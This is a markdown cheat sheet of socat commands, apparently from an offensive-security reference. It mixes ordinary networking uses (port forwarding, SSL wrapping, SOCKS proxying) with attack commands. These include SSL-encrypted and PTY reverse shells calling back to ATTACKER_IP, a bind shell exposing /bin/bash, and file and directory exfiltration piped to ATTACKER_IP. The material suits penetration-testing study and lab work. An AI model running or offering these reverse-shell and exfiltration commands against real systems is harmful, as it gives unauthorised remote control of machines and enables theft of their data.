---
title: "socat CHEATSHEET"
description: "Quick reference for socat commands and techniques"
---

# socat CHEATSHEET

## Basic Operations

```bash
socat TCP-LISTEN:4444,fork STDOUT              # Simple listener
socat - TCP:192.168.1.100:4444                 # Connect to host
socat -V                                       # Show version
```

## SSL/TLS Reverse Shells

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# SSL reverse shell (listener)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# SSL reverse shell (target)
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash

# Full interactive shell with PTY
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Attacker
socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444

# SSL with client certificate verification
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=1,cafile=ca.crt STDOUT
socat OPENSSL:SERVER_IP:4444,cert=client.pem,cafile=ca.crt STDOUT
```

## Port Forwarding

```bash
# TCP forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# UDP forward
socat UDP-LISTEN:53,fork UDP:192.168.1.100:53

# SSL to TCP forward (SSL termination)
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:192.168.1.100:80

# TCP to SSL forward (SSL wrapping)
socat TCP-LISTEN:80,fork OPENSSL:SERVER_IP:443,verify=0
```

## Bind Shells

```bash
# Target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Attacker
socat - TCP:192.168.1.100:4444
```

## File Transfer

```bash
# Send file
socat - TCP:ATTACKER_IP:4444 < file_to_send            # Sender
socat TCP-LISTEN:4444,fork OPEN:received_file,creat     # Receiver

# Send over SSL
socat OPENSSL:ATTACKER_IP:4444,verify=0 FILE:file.txt   # Sender
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 FILE:received_file,creat  # Receiver

# Receive directory
socat TCP-LISTEN:4444,fork EXEC:"tar xf -"
tar czf - /path/to/dir | socat - TCP:ATTACKER_IP:4444
```

## Port Scanning

```bash
socat - TCP:192.168.1.1:80,connect-timeout=2             # Test single port
```

## Remote Access

```bash
# SSH over SSL
socat OPENSSL-LISTEN:2222,cert=server.pem,verify=0,reuseaddr,fork TCP:localhost:22

# Serial console
socat - UNIX-CONNECT:/dev/ttyUSB0,rawer

# Interactive shell with login
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane
```

## SOCKS Proxy

```bash
# SOCKS4a proxy
socat TCP-LISTEN:1080,fork SOCKS4A:proxy_host:target_host:443,socksuser=nobody

# SOCKS5 proxy
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS5-CONNECT:target_host:443,socksuser=nobody
```

## Common Address Types

| Address | Description |
|---------|-------------|
| `TCP-LISTEN:PORT` | TCP listener |
| `TCP:HOST:PORT` | TCP connect |
| `UDP-LISTEN:PORT` | UDP listener |
| `UDP:HOST:PORT` | UDP connect |
| `OPENSSL-LISTEN:PORT` | SSL listener |
| `OPENSSL:HOST:PORT` | SSL connect |
| `EXEC:CMD` | Execute command |
| `SYSTEM:CMD` | Execute via shell |
| `FILE:PATH` | File I/O |
| `OPEN:PATH` | Open file |
| `PTY` | Pseudo terminal |
| `STDOUT` | Standard output |
| `STDIN` | Standard input |
| `SOCKS4A:PROXY:HOST:PORT` | SOCKS4a proxy |
| `SOCKS5-H:PROXY:HOST:PORT` | SOCKS5 proxy |
